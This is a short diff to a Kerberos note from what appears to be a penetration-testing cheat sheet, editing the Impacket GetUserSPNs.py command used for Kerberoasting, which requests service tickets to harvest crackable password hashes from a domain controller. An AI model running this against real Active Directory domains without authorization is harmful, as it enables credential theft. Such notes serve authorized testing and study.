@@ -1,9 +1,9 @@
 # Kerberos
 
-## Find SPN that are associated with a normal user account (Kerberoast) 
+## Kerberoast - script
 
 ```
-GetUserSPNs.py -request -dc-ip <domain-controller> <domain>/<user>:'<password>'
+GetUserSPNs.py -request -dc-ip <domain-controller> <domain>/<user>:<password>
 ```
 
 = domain-controller: $DC
